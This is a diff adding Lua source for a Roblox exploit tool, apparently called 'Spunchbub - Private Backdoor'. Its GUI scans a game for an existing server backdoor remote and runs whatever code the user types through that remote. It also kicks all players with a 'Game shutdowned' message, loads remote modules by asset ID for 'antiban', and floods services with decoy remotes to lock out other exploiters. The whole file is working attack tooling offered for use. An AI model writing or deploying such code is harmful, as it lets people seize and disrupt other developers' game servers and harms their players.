+LMG2L["close_19"]["Size"] = UDim2.new(0, 24, 0, 24);
+LMG2L["close_19"]["Name"] = [[close]];
+LMG2L["close_19"]["Position"] = UDim2.new(0, 430, 0, 0);
+
+LMG2L["LocalScript_1a"] = Instance.new("LocalScript", LMG2L["close_19"]);
+
+LMG2L["UICorner_1b"] = Instance.new("UICorner", LMG2L["Title_18"]);
+LMG2L["UICorner_1b"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["TextLabel_1c"] = Instance.new("TextLabel", LMG2L["Title_18"]);
+LMG2L["TextLabel_1c"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_1c"]["TextSize"] = 18;
+LMG2L["TextLabel_1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Italic);
+LMG2L["TextLabel_1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_1c"]["BackgroundTransparency"] = 1;
+LMG2L["TextLabel_1c"]["RichText"] = true;
+LMG2L["TextLabel_1c"]["Size"] = UDim2.new(0, 138, 0, 11);
+LMG2L["TextLabel_1c"]["Text"] = [[ <font color="#f7f30a">Spunchbub</font> - Private Backdoor ]];
+LMG2L["TextLabel_1c"]["Position"] = UDim2.new(0, 60, 0, 6);
+
+LMG2L["UIStroke_1d"] = Instance.new("UIStroke", LMG2L["Title_18"]);
+LMG2L["UIStroke_1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_1d"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_1d"]["Transparency"] = 0.5;
+
+LMG2L["ImageButton3_1e"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
+LMG2L["ImageButton3_1e"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton3_1e"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+-- LMG2L["ImageButton3_1e"]["Image"] = "rbxassetid://121886242955173";
+LMG2L["ImageButton3_1e"]["Size"] = UDim2.new(0, 34, 0, 34);
+LMG2L["ImageButton3_1e"]["Name"] = [[ImageButton3]];
+LMG2L["ImageButton3_1e"]["Position"] = UDim2.new(0, 349, 0, 271);
+
+LMG2L["LocalScript_sd"] = Instance.new("LocalScript", LMG2L["ImageButton3_1e"])
+
+LMG2L["ImageLabelbl"] = Instance.new("ImageLabel", LMG2L["ImageButton3_1e"]);
+LMG2L["ImageLabelbl"]["Image"] = "rbxassetid://121886242955173";
+LMG2L["ImageLabelbl"]["Size"] = UDim2.new(0, 22, 0, 22);
+LMG2L["ImageLabelbl"]["BackgroundTransparency"] = 1;
+LMG2L["ImageLabelbl"]["Position"] = UDim2.new(0, 6, 0, 6);
+
+LMG2L["UICorner_1f"] = Instance.new("UICorner", LMG2L["ImageButton3_1e"]);
+LMG2L["UICorner_1f"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["UIStroke_20"] = Instance.new("UIStroke", LMG2L["ImageButton3_1e"]);
+LMG2L["UIStroke_20"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_20"]["Thickness"] = 1;
+LMG2L["UIStroke_20"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_20"]["Transparency"] = 0.5;
+
+LMG2L["exec_21"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["exec_21"]["TextStrokeTransparency"] = 0;
+LMG2L["exec_21"]["BorderSizePixel"] = 1;
+LMG2L["exec_21"]["TextSize"] = 18;
+LMG2L["exec_21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["exec_21"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
+LMG2L["exec_21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+LMG2L["exec_21"]["Text"] = [[Execute]];
+LMG2L["exec_21"]["Size"] = UDim2.new(0, 133, 0, 33);
+LMG2L["exec_21"]["Name"] = [[exec]];
+LMG2L["exec_21"]["Position"] = UDim2.new(0, 6, 0, 272);
+
+LMG2L["UICorner_22"] = Instance.new("UICorner", LMG2L["exec_21"]);
+LMG2L["UICorner_22"]["CornerRadius"] = UDim.new(0, 6);
+
+LMG2L["LocalScript_23"] = Instance.new("LocalScript", LMG2L["exec_21"]);
+
+LMG2L["UIStroke_24"] = Instance.new("UIStroke", LMG2L["exec_21"]);
+LMG2L["UIStroke_24"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+LMG2L["UIStroke_24"]["Thickness"] = 1;
+LMG2L["UIStroke_24"]["Color"] = Color3.fromRGB(97, 97, 97);
+LMG2L["UIStroke_24"]["Transparency"] = 0.5;
+
+LMG2L["ImageLabel_25"] = Instance.new("ImageLabel", LMG2L["Frame_5"]);
+LMG2L["ImageLabel_25"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageLabel_25"]["Image"] = [[rbxassetid://89640858025803]];
+LMG2L["ImageLabel_25"]["Size"] = UDim2.new(0, 277, 0, 272);
+LMG2L["ImageLabel_25"]["BackgroundTransparency"] = 1;
+LMG2L["ImageLabel_25"]["ImageTransparency"] = 0.43;
+LMG2L["ImageLabel_25"]["Position"] = UDim2.new(0.204, 0, 0.035, 0);
+
+function EnableDrag(frame)
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		
+		-- Tweening for smoothness
+		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+
+task.spawn(function()
+    EnableDrag(LMG2L["Main_2"])
+end)
+
+-- Scripts
+local function C_8()
+	local script = LMG2L["LocalScript_8"];
+	script.Parent.MouseButton1Click:Connect(function()	
+	      local editor = script.Parent.Parent.EditorScroll.Editor	
+	      if editor.TextTransparency == 0 then
+             editor.TextTransparency = 1
+             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://135928786788378";
+          else
+             editor.TextTransparency = 0
+             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://100033680381365";
+          end
+	end)	
+end;
+task.spawn(C_8);
+
+local function C_10()
+	local script = LMG2L["LocalScript_10"];
+	script.Parent.MouseButton1Click:Connect(function()	
+	      script.Parent.Parent.EditorScroll.Editor.Text = ""	
+	end)	
+end;
+task.spawn(C_10);
+
+local function C_1a()
+	local script = LMG2L["LocalScript_1a"];
+	script.Parent.MouseButton1Click:Connect(function()	
+	      script.Parent.Parent.Parent.Parent.Parent:Destroy()	
+	end)	
+end;
+task.spawn(C_1a);
+
+local function C_r6()
+	local script = LMG2L["LocalScript_r6"];
+	script.Parent.MouseButton1Click:Connect(function()	
+           fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
+     end)
+end;
+task.spawn(C_r6);
+
+local function C_ni()
+	local script = LMG2L["LocalScript_ni"];
+	script.Parent.MouseButton1Click:Connect(function()	
+           fireRemoteEvent("game.Players." .. game.Players.LocalPlayer.Name .. ":LoadCharacter()")
+     end)
+end;
+task.spawn(C_ni);
+
+local function C_sd()
+	local script = LMG2L["LocalScript_sd"];
+	script.Parent.MouseButton1Click:Connect(function()	
+           fireRemoteEvent([[
+              for _, v in pairs(game.Players:GetPlayers()) do
+                 v:Kick("Game shutdowned by Spunchbub - Private Backdoor")
+              end
+		   ]])
+     end)
+end;
+task.spawn(C_sd);
+
+local function C_23()
+	local script = LMG2L["LocalScript_23"];
+	script.Parent.MouseButton1Click:Connect(function()	
+	      local code = script.Parent.Parent.EditorScroll.Editor.Text	
+	      if code ~= "" then
+                local success, result = pcall(function()
+	               fireRemoteEvent(code)
+                end)
+                if success and foundExploit then
+                   notify.Info("Spunchbub","Successfully executed script!")
+                elseif not foundExploit and success then
+                   notify.Warn("Spunchbub","Failed to execute script, No backdoor.")
+                else
+                   notify.Error("Spunchbub","Failed to execute script!")
+                end
+	      else	
+	           notify.Warn("Spunchbub","Put a script first!")	
+          end	
+	end)	
+end;
+task.spawn(C_23);
+
+local currentRemote
+local ancestryConnection
+local isScanning = false
+
+local function watchRemote(remote)
+    if ancestryConnection then
+        ancestryConnection:Disconnect()
+        ancestryConnection = nil
+    end
+
+    if not remote or typeof(remote) ~= "Instance" then return end
+    currentRemote = remote
+
+    ancestryConnection = remote.AncestryChanged:Connect(function(_, parent)
+        if not parent and not isScanning then
+            isScanning = true
+            notify.Error("Spunchbub", "Backdoor removed, attempting to scan...")
+
+            local newRemote = nil
+            
+            for i = 1, 6 do
+                task.wait(0.5)
+                local found = findRemote()
+                if found and found ~= remote then
+                    newRemote = found
+                    break
+                end
+            end
+
+            if newRemote then
+                notify.Info("Spunchbub", "New backdoor found!")
+                isScanning = false
+                watchRemote(newRemote)
+            else
+                notify.Error("Spunchbub", "Scan failed. No backdoor was found.")
+                isScanning = false
+                currentRemote = nil
+            end
+        end
+    end)
+end
+
+local initial = remoteEvent or remoteFunction
+if not initial then
+    initial = findRemote()
+end
+
+if initial then
+    watchRemote(initial)
+end
+        
+       fireRemoteEvent([[
+local services = {
+ game:GetService("PathfindingService"),
+ game:GetService("PolicyService"),
+ game:GetService("TestService"),
+ game:GetService("FriendService"),
+ game:GetService("SoundService"),
+ game:GetService("LocalizationService"),
+ game:GetService("MarketplaceService"),
+ game:GetService("HttpService"),
+ game:GetService("FeatureRestrictionManager"),
+ game:GetService("Lighting"),
+ game:GetService("ReplicatedStorage")
+}
+
+math.randomseed(os.clock() * 1e6)
+
+local function rand()
+ local t = {}
+ for i = 1, math.random(6,12) do
+  t[i] = string.char(
+   math.random(97,122)
+  )
+ end
+ return table.concat(t)
+end
+
+for _, svc in ipairs(services) do
+ local p = svc
+
+ for i = 1, 100 do
+  local f = Instance.new("Folder")
+  f.Name = rand()
+  f.Parent = p
+  p = f
+ end
+
+ local r = Instance.new("RemoteFunction")
+ r.Name = "rbxAssetid_core__temp_3023g78"
+ r.OnServerInvoke = function(plr)
+  plr:Kick("Backdoor has been secured by Spunchbub - Private Backdoor")
+ end
+ r.Parent = p
+end
+]])  
+
+fireRemoteEvent([[
+	local services = {
+    game:GetService("PathfindingService"),
+    game:GetService("PolicyService"),
+    game:GetService("TestService"),
+    game:GetService("FriendService"),
+    game:GetService("SoundService"),
+    game:GetService("LocalizationService"),
+    game:GetService("MarketplaceService"),
+    game:GetService("HttpService"),
+	game:GetService("FeatureRestrictionManager"),
+	game:GetService("Lighting"),
+	game:GetService("ReplicatedStorage")
+}
+
+for _, svc in ipairs(services) do
+  for r = 1, 100 do 
+    local r = Instance.new("RemoteFunction")
+    r.Name = "spunch.bd_cssr6-O1"
+    r.OnServerInvoke = function(player)
+        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
+    end
+    r.Parent = svc
+  end
+end]])
+fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")end)')
+fireRemoteEvent('require(7458325257).antiban()')
+fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+        notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti ban.")
+    else
+        LMG2["ScanButton_c"]["Text"] = "No backdoor found :("
+        task.wait(2)
+        LMG2["ScanButton_c"]["Text"] = "Scan Backdoor"
+    end
+end)
